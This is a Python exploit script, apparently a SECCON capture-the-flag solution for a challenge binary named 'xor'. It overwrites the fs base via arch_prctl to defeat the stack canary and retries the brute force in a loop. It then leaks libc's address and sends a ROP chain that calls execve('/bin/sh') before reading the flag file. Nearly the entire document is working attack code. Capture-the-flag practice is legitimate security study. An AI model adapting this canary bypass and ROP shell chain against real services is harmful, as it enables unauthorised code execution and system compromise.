from ptrlib import *
import os
import time

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9999"))

libc = ELF("libc.so.6")
elf = ELF("./xor")

while True:
    #sock = Process("../files/xor")
    sock = Socket(HOST, PORT)

    payload  = b"\x00"*0x40
    payload += p64(elf.section('.bss') + 0x100) # fs
    payload += p64(0x1002) # ARCH_SET_FS
    payload += b'\x90\x6b' # arch_prctl
    sock.send(payload)
    time.sleep(0.3)

    try:
        payload  = b"A"*0x20
        payload += p64(0)
        payload += p64(0) # status
        payload += p64(0)
        payload += p64(0) # canary
        payload += p64(elf.section('.data') - 0x18 + 0x60) # rbp
        payload += p64(0x401255)
        sock.send(payload)
        time.sleep(0.3)

        payload  = b"\x00"*0x20
        payload += p64(0)
        payload += p64(0) # status
        payload += p64(0)
        payload += p64(0) # canary
        payload += p64(elf.section('.data') + 0x60) # rbp
        payload += p64(0x401255)
        sock.send(payload)
        time.sleep(0.3)

        sock.recvonce(0x20, timeout=0.8)
    except (TimeoutError, BrokenPipeError):
        logger.warning("Bad luck!")
        sock.close()
        continue
    libc.base = u64(sock.recvonce(0x20)[0:8]) - libc.symbol("read")

    payload  = p64(next(libc.gadget("pop rdi; ret;")))
    payload += p64(next(libc.search("/bin/sh")))
    payload += p64(next(libc.gadget("pop rsi; ret;")))
    payload += p64(0)
    payload += p64(next(libc.gadget("xor edx, edx; mov eax, edx; ret;")))
    payload += p64(libc.symbol("execve"))
    sock.send(payload)
    break

sock.sendline("cat /flag*")
print(sock.recvline())
sock.close()
